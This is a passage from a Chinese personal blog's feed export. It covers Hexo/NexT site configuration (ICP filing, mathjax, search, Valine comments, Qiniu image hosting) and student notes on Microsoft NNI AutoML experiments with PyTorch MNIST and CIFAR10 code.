<h2 id="添加备案号"><a href="#添加备案号" class="headerlink" title="添加备案号"></a>添加备案号</h2><p>网站还是得加备案号的，不过这里不用改模板，直接在NexT主题的<code>_config.yml</code>中修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">footer:</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  # Beian ICP and gongan information for Chinese users. See: http:&#x2F;&#x2F;www.beian.miit.gov.cn, http:&#x2F;&#x2F;www.beian.gov.cn</span><br><span class="line">  beian:</span><br><span class="line">    enable: true</span><br><span class="line">    icp: 粤ICP备2021003110号</span><br><span class="line">    # The digit in the num of gongan beian.</span><br><span class="line">    gongan_id:</span><br><span class="line">    # The full num of gongan beian.</span><br><span class="line">    gongan_num: 2021003110</span><br><span class="line">    # The icon for gongan beian. See: http:&#x2F;&#x2F;www.beian.gov.cn&#x2F;portal&#x2F;download</span><br><span class="line">    gongan_icon_url: images&#x2F;beian.png</span><br></pre></td></tr></table></figure>
<p>在主题文件夹中的<code>source</code>中新建个<code>images</code>文件夹，可以把<a href="http://www.beian.gov.cn/portal/download">这张图片</a>下载到里面去，就可以用相对路径引用了。btw，对头像的设置也是同理。</p>
<h2 id="mathjax支持"><a href="#mathjax支持" class="headerlink" title="mathjax支持"></a>mathjax支持</h2><p>这个东西曾经困扰了我很久，其实只要按下面的顺序，NexT主题也能用上mathjax。</p>
<p>先更换Hexo的Markdown渲染引擎：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure>
<p>需要在<code>node_modules/kramed/lib/rules/inline.js</code>中修改两处（分别是原第11行和第20行）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;escape: &#x2F;^\\([\\&#96;*&#123;&#125;\[\]()#$+\-.!_&gt;])&#x2F;,</span><br><span class="line">escape: &#x2F;^\\([&#96;*\[\]()#$+\-.!_&gt;])&#x2F;,</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;em: &#x2F;^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)&#x2F;,</span><br><span class="line">em: &#x2F;^\*((?:\*\*|[\s\S])+?)\*(?!\*)&#x2F;,</span><br></pre></td></tr></table></figure>
<p>最后在每个需要启用mathjax的博客页面里，在一开始的Front-matter那里加上一句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mathjax: true</span><br></pre></td></tr></table></figure>
<p>这样就可以用上LaTeX语法写行内公式和行间公式了。</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/My-Hexo-Blog-Configuration/2021-01-08_23-29.png">
<h2 id="搜索框"><a href="#搜索框" class="headerlink" title="搜索框"></a>搜索框</h2><p>搜索框也很容易实现。</p>
<p>先用npm安装下插件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install --save hexo-generator-search</span><br><span class="line">$ npm install --save hexo-generator-searchdb</span><br></pre></td></tr></table></figure>
<p>在NexT主题文件夹下的<code>_config.yml</code>下修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure>
<p>重新部署一下之后，就可以看到出现了搜索框。</p>
<h2 id="评论系统支持"><a href="#评论系统支持" class="headerlink" title="评论系统支持"></a>评论系统支持</h2><p>评论系统中，NexT主题的配置中自带对Valine的支持，我们干脆直接用它咯！</p>
<h3 id="Valine的使用"><a href="#Valine的使用" class="headerlink" title="Valine的使用"></a>Valine的使用</h3><ol>
<li>在LeanCloud注册</li>
<li>创建应用，名称随意</li>
<li>进入“设置-应用Keys”，获取App ID和AppKey</li>
<li>在主题文件夹中的<code>_config.yml</code>修改Valine对应内容为：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">valine:</span><br><span class="line">  enable: true</span><br><span class="line">  appid: Your leancloud application appid</span><br><span class="line">  appkey: Your leancloud application appkey</span><br><span class="line">  notify: true # Mail notifier</span><br><span class="line">  verify: false # Verification code</span><br><span class="line">  placeholder: Just go go # Comment box placeholder</span><br><span class="line">  avatar: mm # Gravatar style</span><br><span class="line">  guest_info: nick,mail,link # Custom comment header</span><br><span class="line">  pageSize: 10 # Pagination size</span><br><span class="line">  language: zh-cn # Language, available values: en, zh-cn</span><br><span class="line">  visitor: true # Article reading statistic</span><br><span class="line">  comment_count: true # If false, comment count will only be displayed in post page, not in home page</span><br><span class="line">  recordIP: false # Whether to record the commenter IP</span><br><span class="line">  serverURLs: # When the custom domain name is enabled, fill it in here (it will be detected automatically by default, no need to fill in)</span><br><span class="line">  #post_meta_order: 0</span><br></pre></td></tr></table></figure>
<p>然后在储存-结构化数据中创建两个新的Class，名称分别为<code>Comment</code>和<code>Counter</code>，分别可以用来存评论和链接访问数，非常方便。</p>
<p>在LeanCloud后台看到的数据就是这样的：</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/My-Hexo-Blog-Configuration/2021-01-08_22-44.png">
<p>之后部署一下就可以看到效果了！</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/My-Hexo-Blog-Configuration/2021-01-08_22-42.png">
<h2 id="七牛云图床"><a href="#七牛云图床" class="headerlink" title="七牛云图床"></a>七牛云图床</h2><p>首先先在博客根目录安装一下需要的Hexo插件：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install --save hexo-qiniu-sync</span><br></pre></td></tr></table></figure><br>在七牛云右上角的密钥管理就可以找到access key和secret key了，bucket填你自己创建时写的空间名称，在<code>_config.yml</code>里面添加这一段配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qiniu:</span><br><span class="line">  offline: false</span><br><span class="line">  sync: true</span><br><span class="line">  bucket: &quot;your_bucket_name&quot;</span><br><span class="line">  access_key: &quot;your_access_key&quot;</span><br><span class="line">  secret_key: &quot;your_secret_key&quot;</span><br><span class="line">  dirPrefix: static</span><br><span class="line">  urlPrefix: http:&#x2F;&#x2F;&quot;your_qiniu_url&quot;&#x2F;static</span><br><span class="line">  up_host: http:&#x2F;&#x2F;upload.qiniu.com</span><br><span class="line">  local_dir: static</span><br><span class="line">  update_exist: true</span><br><span class="line">  image: </span><br><span class="line">    folder: images</span><br><span class="line">    extend: </span><br><span class="line">  js:</span><br><span class="line">    folder: js</span><br><span class="line">  css:</span><br><span class="line">    folder: css</span><br></pre></td></tr></table></figure>
<p>在文档中，就不需要使用Markdown的插入图片格式了，使用下面的格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% qnimg test.jpg %&#125;</span><br></pre></td></tr></table></figure>
<p>这样的语句会自动读取<code>static/images/test.jpg</code>这个路径下的图片。</p>
<p>在更新博客时，可以先跑一下这条命令，将<code>static/images</code>下的所有图片都上传到七牛云，这样博客的外链就能访问出图片了。</p>
<p>不过不跑似乎也没关系，在<code>hexo g</code>的时候似乎会自动帮你上传，挺贴心的。</p>
<h2 id="小彩蛋"><a href="#小彩蛋" class="headerlink" title="小彩蛋"></a>小彩蛋</h2><h3 id="我大E了啊"><a href="#我大E了啊" class="headerlink" title="我大E了啊"></a>我大E了啊</h3><p>在配置的时候有一次跑<code>hexo g -d</code>的时候报错了，怎么改都改不好，心态差点崩了，差点要把整个博客重新弄一遍。</p>
<p>这种情况的最好解决方法是一开始就用git维护整个仓库。最后我直接用<code>git reset</code>回滚到上次commit的时候，一切就又都回来了。我又继续无止境地配置下去了……</p>
<h3 id="什么？DDL？"><a href="#什么？DDL？" class="headerlink" title="什么？DDL？"></a>什么？DDL？</h3><p>啊？什么？我今天没赶DDL？</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/My-Hexo-Blog-Configuration/WeChat_Image_20210108221702.jpg">
<p>其实明天是数创大作业的deadline。。。</p>
<p>放心，明天弄得完的。deadline是第一生产力。。。</p>
<p>熬夜继续爆肝大作业，还不如早点休息。。。</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/My-Hexo-Blog-Configuration/84869490_p0.jpg">
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/as480133937/article/details/100138838">https://blog.csdn.net/as480133937/article/details/100138838</a></p>
<p><a href="https://blog.csdn.net/yexiaohhjk/article/details/82526604">https://blog.csdn.net/yexiaohhjk/article/details/82526604</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/34747279">https://zhuanlan.zhihu.com/p/34747279</a></p>
<p><a href="https://www.jianshu.com/p/70bf58c48010">https://www.jianshu.com/p/70bf58c48010</a></p>
]]></content>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>NNI Student Program 2020 Task1</title>
    <url>/2021/01/08/NNI-Student-Program-2020-Task1/</url>
    <content><![CDATA[<h1 id="Task-1-入门任务"><a href="#Task-1-入门任务" class="headerlink" title="Task 1 入门任务"></a>Task 1 入门任务</h1><h2 id="NNI-体验文档"><a href="#NNI-体验文档" class="headerlink" title="NNI 体验文档"></a>NNI 体验文档</h2><h3 id="1-AutoML-工具比较"><a href="#1-AutoML-工具比较" class="headerlink" title="1. AutoML 工具比较"></a>1. AutoML 工具比较</h3><p>机器学习算法与模型的选择，对机器学习十分重要，一个成功的选择，能够成倍提高训练效率，从而提高模型准确度，减少损失，产生更大的效益。</p>
<p>但算法与模型的选择并不简单。就算是数据科学家，也需要花费大量的时间用于尝试与权衡不同模型的优劣，最终才能得出理想的结果。超参的调参过程中也经常造成算力的浪费。</p>
<p>自动机器学习（AutoML）是一套自动化的机器学习应用工具，旨在用自动化工具完成特征工程、自动调参等优化工作。</p>
<p>当前，自动机器学习平台早已问世，下面介绍几个著名的AutoML工具，并列出优缺点，以供比较。</p>
<h4 id="auto-sklearn"><a href="#auto-sklearn" class="headerlink" title="auto-sklearn"></a>auto-sklearn</h4><p>auto-sklearn是GitHub上开源的一个基于sklearn的自动机器学习工具，目前已获得5.1k个星。</p>
<p>优点：可限制训练时间，支持切分训练集和测试集，支持交叉验证。</p>
<p>缺点：输出信息较少，优化算法单一。</p>
<h4 id="Google-Cloud-AutoML"><a href="#Google-Cloud-AutoML" class="headerlink" title="Google Cloud AutoML"></a>Google Cloud AutoML</h4><p>Google Cloud AutoML基于高精度的深度神经网络而设计，可用于图像分类、自然语言处理、语音翻译等。</p>
<p>优点：具有较完整的谷歌ML生态链，Tensorflow+Colab+Cloud AutoML共同使用时非常方便。</p>
<p>优点：具有完整图形界面，对新手用户友好，同时提供API调用，分类详尽。</p>
<p>缺点：完整版需付费，访问需科学上网。</p>
<h4 id="Microsoft-NNI"><a href="#Microsoft-NNI" class="headerlink" title="Microsoft NNI"></a>Microsoft NNI</h4><p>NNI(Neural Network Intelligence)是微软亚洲研究院开源的自动机器学习工具，面向研究人员和算法工程师而设计，2018年9月问世，目前已经更新至v1.9。</p>
<p>优点：具有多平台支持，可命令行操作，支持结果可视化。内置优化算法多，扩展性强，支持远程调用进行集群训练。</p>
<p>缺点：暂未发现</p>
<p>更详细的对比：</p>
<p><img data-src="https://www.msra.cn/wp-content/uploads/2019/12/nni-2.png" alt></p>
<p>（摘自MSRA官网）</p>
<h3 id="2-NNI-安装及使用"><a href="#2-NNI-安装及使用" class="headerlink" title="2. NNI 安装及使用"></a>2. NNI 安装及使用</h3><p>NNI的安装非常简单，只需一行命令即可安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pip install --upgrade nni</span><br></pre></td></tr></table></figure>
<p>本人强烈推荐将nni安装在Anaconda的环境中，可通过在PyCharm中设置Python解释器，实现对NNI的调用。</p>
<p>使用NNI，需要在原有神经网络代码的基础上做出些许修改：</p>
<ol>
<li>通过nni模块获得参数</li>
<li>向nni报告中间结果</li>
<li>向nni报告最终结果</li>
</ol>
<p>修改好代码并且准备好搜索空间和配置文件后，就可以通过一行命令开始使用NNI：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nnictl create --config your-config.yml</span><br></pre></td></tr></table></figure>
<p>具体会在下述代码部分进行解释。</p>
<h3 id="3-NNI-使用感受"><a href="#3-NNI-使用感受" class="headerlink" title="3. NNI 使用感受"></a>3. NNI 使用感受</h3><p>NNI易于安装，易于使用，有一套完善的命令行控制工具，也有结果可视化界面，对机器学习实验与研究提供了巨大的便利。</p>
<p>本人大一，尚未接触过多机器学习知识，但通过在本地跑通多个样例后，能感受到NNI在机器学习方面的威力，希望未来能够掌握NNI，方便未来的研究与学习。</p>
<h2 id="NNI-样例分析文档"><a href="#NNI-样例分析文档" class="headerlink" title="NNI 样例分析文档"></a>NNI 样例分析文档</h2><h3 id="配置文件：config-windows-yml"><a href="#配置文件：config-windows-yml" class="headerlink" title="配置文件：config_windows.yml"></a>配置文件：config_windows.yml</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">authorName: default</span><br><span class="line">experimentName: example_mnist_pytorch</span><br><span class="line">trialConcurrency: 1</span><br><span class="line">maxExecDuration: 2h</span><br><span class="line">maxTrialNum: 10</span><br><span class="line">#choice: local, remote, pai</span><br><span class="line">trainingServicePlatform: local</span><br><span class="line">searchSpacePath: search_space.json</span><br><span class="line">#choice: true, false</span><br><span class="line">useAnnotation: false</span><br><span class="line">tuner:</span><br><span class="line">  #choice: TPE, Random, Anneal, Evolution, BatchTuner, MetisTuner, GPTuner</span><br><span class="line">  #SMAC (SMAC should be installed through nnictl)</span><br><span class="line">  builtinTunerName: TPE</span><br><span class="line">  classArgs:</span><br><span class="line">    #choice: maximize, minimize</span><br><span class="line">    optimize_mode: maximize</span><br><span class="line">trial:</span><br><span class="line">  command: python mnist.py</span><br><span class="line">  codeDir: .</span><br><span class="line">  gpuNum: 0</span><br></pre></td></tr></table></figure>
<h3 id="搜索空间：search-space-json"><a href="#搜索空间：search-space-json" class="headerlink" title="搜索空间：search_space.json"></a>搜索空间：search_space.json</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;batch_size&quot;</span>: &#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>, <span class="attr">&quot;_value&quot;</span>: [<span class="number">16</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">128</span>]&#125;,</span><br><span class="line">    <span class="attr">&quot;hidden_size&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>,<span class="attr">&quot;_value&quot;</span>:[<span class="number">128</span>, <span class="number">256</span>, <span class="number">512</span>, <span class="number">1024</span>]&#125;,</span><br><span class="line">    <span class="attr">&quot;lr&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>,<span class="attr">&quot;_value&quot;</span>:[<span class="number">0.0001</span>, <span class="number">0.001</span>, <span class="number">0.01</span>, <span class="number">0.1</span>]&#125;,</span><br><span class="line">    <span class="attr">&quot;momentum&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;uniform&quot;</span>,<span class="attr">&quot;_value&quot;</span>:[<span class="number">0</span>, <span class="number">1</span>]&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>代码部分只需要在原有PyTorch代码上进行些许修改。</p>
<ol>
<li>参数选择无需在程序中给定，而是通过nni获得：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tuner_params = nni.get_next_parameter()</span><br></pre></td></tr></table></figure></li>
<li>在每个epoch学习完成后，报告中间结果：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nni.report_intermediate_result(test_acc)</span><br></pre></td></tr></table></figure></li>
<li>在训练完整结束后，报告最终结果：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nni.report_final_result(test_acc)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p>如图，10次trial都成功地完成，其中id为9的trial达到了最高准确率，达99.34%。</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task1/1.png">

<img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task1/4.png">

<h4 id="超参组合可视化"><a href="#超参组合可视化" class="headerlink" title="超参组合可视化"></a>超参组合可视化</h4><img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task1/5.png">

<p>图中，准确率更高的组合用红线表示，而准确率低的用绿线表示。</p>
<p>可以看出，当batch_size选择16，lr和momentum大小适中时，模型可以达到99%以上的准确率，实验效果非常理想。</p>
<h4 id="训练结果可视化"><a href="#训练结果可视化" class="headerlink" title="训练结果可视化"></a>训练结果可视化</h4><img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task1/3.png">

<p>Default Metric</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task1/2.png">

<p>Sorted Default Metric</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task1/6.png">

<p>Trial Duration</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task1/7.png">

<p>Intermediate Results</p>
<hr>
<p>Jan 23rd upd: 楼下的评论说的有道理，把评论搬上来……</p>
<p>在跑NNI的时候，有时经常遇见任何一个trial跑几秒就失败的情况。</p>
<p>顺着实验文件夹里面的<code>stderr</code>去看，原来报错是这个：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Error: mkl-service + Intel(R) MKL: MKL_THREADING_LAYER&#x3D;INTEL is incompatible with libgomp.so.1 library.</span><br><span class="line">    Try to import numpy first or set the threading layer accordingly. Set MKL_SERVICE_FORCE_INTEL to force it.</span><br></pre></td></tr></table></figure>
<p>解决方法是按它所说的：在终端中设置下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">export</span> MKL_SERVICE_FORCE_INTEL=1</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>NNI</tag>
      </tags>
  </entry>
  <entry>
    <title>NNI Exploration Learning Notes</title>
    <url>/2021/01/23/NNI-Exploration-Learning-Notes/</url>
    <content><![CDATA[<h2 id="未完成任务"><a href="#未完成任务" class="headerlink" title="未完成任务"></a>未完成任务</h2><h3 id="Task-2-2"><a href="#Task-2-2" class="headerlink" title="Task 2.2"></a>Task 2.2</h3><p>-[] HPO<br>-[] 在搜索空间中选择随机结构，并验证性能<br>-[] NAS</p>
<h3 id="Task-3-1"><a href="#Task-3-1" class="headerlink" title="Task 3.1"></a>Task 3.1</h3><p>-[] 跑通NNI Feature Engineering Sample</p>
<h3 id="Task-3-2"><a href="#Task-3-2" class="headerlink" title="Task 3.2"></a>Task 3.2</h3><h4 id="Task-3-2-1"><a href="#Task-3-2-1" class="headerlink" title="Task 3.2.1"></a>Task 3.2.1</h4><h4 id="Task-3-2-2"><a href="#Task-3-2-2" class="headerlink" title="Task 3.2.2"></a>Task 3.2.2</h4><h3 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h3><h2 id="HPO"><a href="#HPO" class="headerlink" title="HPO"></a>HPO</h2><p>超参调优在NNI中比较好实现，只要有参数和模型的搜索空间，就可以利用NNI自带的tuner来做调参工作。</p>
<h3 id="Assessor"><a href="#Assessor" class="headerlink" title="Assessor"></a>Assessor</h3><p>在数据量较大的情况下，一般一个trial普遍会比较久，NNI支持Assessor，实现在调优过程中类似“剪枝”的功能，提供了提前终止某些trial的策略以节省实验时间。</p>
<p>需要添加assessor时只需在<code>config.yml</code>中添加，这里以Curvefitting为例：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">assessor:</span></span><br><span class="line">  <span class="attr">builtinAssessorName:</span> <span class="string">Curvefitting</span></span><br><span class="line">  <span class="attr">classArgs:</span></span><br><span class="line">    <span class="attr">epoch_num:</span> <span class="number">10</span></span><br><span class="line">    <span class="attr">threshold:</span> <span class="number">0.9</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="NAS"><a href="#NAS" class="headerlink" title="NAS"></a>NAS</h2><h3 id="搜索空间的编写"><a href="#搜索空间的编写" class="headerlink" title="搜索空间的编写"></a>搜索空间的编写</h3><p>在做NAS的过程中，我们需要手动写出待搜索的模型的类，我们借助NNI中的mutables来实现模型搜索空间的构建。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NeuralNet</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(NeuralNet, self).__init__()</span><br><span class="line">        self.conv1 = mutables.LayerChoice([</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, padding=<span class="number">2</span>)</span><br><span class="line">        ], key=<span class="string">&#x27;conv1&#x27;</span>)</span><br><span class="line">        self.mid_conv = mutables.LayerChoice([</span><br><span class="line">            nn.Conv2d(<span class="number">8</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">8</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, padding=<span class="number">2</span>)</span><br><span class="line">        ], key=<span class="string">&#x27;mid_conv&#x27;</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="number">8</span>, <span class="number">16</span>, <span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line">        self.pool = nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        self.func1 = nn.Linear(<span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>, <span class="number">120</span>)</span><br><span class="line">        self.func2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.func3 = nn.Linear(<span class="number">84</span>, <span class="number">10</span>)</span><br><span class="line">        self.input_switch = mutables.InputChoice(n_candidates=<span class="number">1</span>, key=<span class="string">&#x27;skip&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = self.pool(F.relu(self.conv1(x)))</span><br><span class="line">        x = self.mid_conv(x)</span><br><span class="line">        skip_x = self.input_switch([x])</span><br><span class="line">        x = self.conv2(x)</span><br><span class="line">        <span class="keyword">if</span> skip_x <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            x = x + skip_x</span><br><span class="line">        x = self.pool(F.relu(x))</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>)</span><br><span class="line">        x = F.relu(self.func1(x))</span><br><span class="line">        x = F.relu(self.func2(x))</span><br><span class="line">        x = self.func3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure>
<p><code>mutables.LayerChoice</code>实现了神经网络模型中一层的多选一，待选的神经网络层只需要在里面列出来即可。例如上面的代码，就实现了3*3和5*5两种二维卷积层的选择空间。</p>
<p><code>mutables.InputChoice</code>实现了可跳过连接。在上述代码中，表示了mid_conv层是可跳过层。可跳过层的前后代码保持不变，在可跳过层则需要从可能连接加入到后一层的输出中。</p>
<h3 id="Classical-NAS"><a href="#Classical-NAS" class="headerlink" title="Classical NAS"></a>Classical NAS</h3><h3 id="One-shot-NAS"><a href="#One-shot-NAS" class="headerlink" title="One-shot NAS"></a>One-shot NAS</h3><h3 id="DARTS"><a href="#DARTS" class="headerlink" title="DARTS"></a>DARTS</h3><h3 id="ENAS"><a href="#ENAS" class="headerlink" title="ENAS"></a>ENAS</h3>]]></content>
      <tags>
        <tag>NNI</tag>
      </tags>
  </entry>
  <entry>
    <title>NNI Student Program 2020-Task2</title>
    <url>/2021/01/08/NNI-Student-Program-2020-Task2/</url>
    <content><![CDATA[<h1 id="Task2-进阶任务-HPO-NAS"><a href="#Task2-进阶任务-HPO-NAS" class="headerlink" title="Task2 进阶任务 HPO+NAS"></a>Task2 进阶任务 HPO+NAS</h1><h2 id="Task-2-1"><a href="#Task-2-1" class="headerlink" title="Task 2.1"></a>Task 2.1</h2><h3 id="CIFAR10简介"><a href="#CIFAR10简介" class="headerlink" title="CIFAR10简介"></a>CIFAR10简介</h3><p>CIFAR10数据集共有60000张分辨率为32*32的彩色图像，分为十类，每类都有6000张图像。</p>
<p>50000张图像构成训练集，10000张图像构成测试集。</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task2/1.png">

<h3 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h3><p>我们使用PyTorch编写卷积神经网络来解决这项图像分类任务。</p>
<p>大体流程如下：</p>
<ol>
<li>使用torchvision下载数据集，读取数据集</li>
<li>定义解决该问题的卷积神经网络</li>
<li>训练神经网络</li>
<li>测试神经网络</li>
</ol>
<p>代码中的神经网络有两个卷积层：</p>
<ol>
<li>第一层，3个输入（RGB），6个输出。</li>
<li>第二层，6个输入，16个输出。</li>
</ol>
<p>池化层通过<code>torch.nn.MaxPool2d</code>来创建。</p>
<p>然后定义三个全连接函数：</p>
<ol>
<li>第一个，将16*5*5个节点连接至120个节点。</li>
<li>第二个，将120个节点连接到84个节点。</li>
<li>第三个，将84个节点连接到10个节点，即对应分类。</li>
</ol>
<p>激活函数全程使用Relu函数。</p>
<p>误差函数使用交叉熵函数，优化方法使用SGD。</p>
<h3 id="实验配置"><a href="#实验配置" class="headerlink" title="实验配置"></a>实验配置</h3><p>使用Anaconda环境下的Python3.8，使用PyCharm运行程序。</p>
<p>设置程序不使用GPU，只用CPU完成训练。</p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>我们利用了<code>torch.nn</code>模块定义了本任务的神经网络。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NeuralNet</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(NeuralNet, self).__init__()</span><br><span class="line">        self.conv1 = nn.Conv2d(<span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>)</span><br><span class="line">        self.pool = nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="number">6</span>, <span class="number">16</span>, <span class="number">5</span>)</span><br><span class="line">        self.func1 = nn.Linear(<span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>, <span class="number">120</span>)</span><br><span class="line">        self.func2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.func3 = nn.Linear(<span class="number">84</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = self.pool(F.relu(self.conv1(x)))</span><br><span class="line">        x = self.pool(F.relu(self.conv2(x)))</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>) <span class="comment"># -1 means uncertain number</span></span><br><span class="line">        x = F.relu(self.func1(x))</span><br><span class="line">        x = F.relu(self.func2(x))</span><br><span class="line">        x = self.func3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>而训练过程中，使用PyTorch的写法是这样的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>(<span class="params">trainloader, path</span>):</span></span><br><span class="line">    neuralnet = NeuralNet()</span><br><span class="line">    criterion = nn.CrossEntropyLoss()</span><br><span class="line">    optimizer = optim.SGD(neuralnet.parameters(), lr=<span class="number">0.001</span>, momentum=<span class="number">0.9</span>)</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        running_loss = <span class="number">0.0</span></span><br><span class="line">        <span class="keyword">for</span> i, data <span class="keyword">in</span> <span class="built_in">enumerate</span>(trainloader, <span class="number">0</span>):</span><br><span class="line">            inputs, labels = data</span><br><span class="line">            <span class="comment"># training template for PyTorch</span></span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            outputs = neuralnet(inputs)</span><br><span class="line">            loss = criterion(outputs, labels)</span><br><span class="line">            loss.backward()</span><br><span class="line">            optimizer.step()</span><br><span class="line"></span><br><span class="line">            running_loss += loss.item()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">2000</span> == <span class="number">1999</span>:</span><br><span class="line">                print(<span class="string">&#x27;[%5d, %5d] loss = %.5f&#x27;</span> % (epoch + <span class="number">1</span>, i + <span class="number">1</span>, running_loss / <span class="number">2000</span>))</span><br><span class="line">                running_loss = <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">    torch.save(neuralnet.state_dict(), path)</span><br><span class="line">    print(<span class="string">&#x27;Training Finished&#x27;</span>)</span><br></pre></td></tr></table></figure>
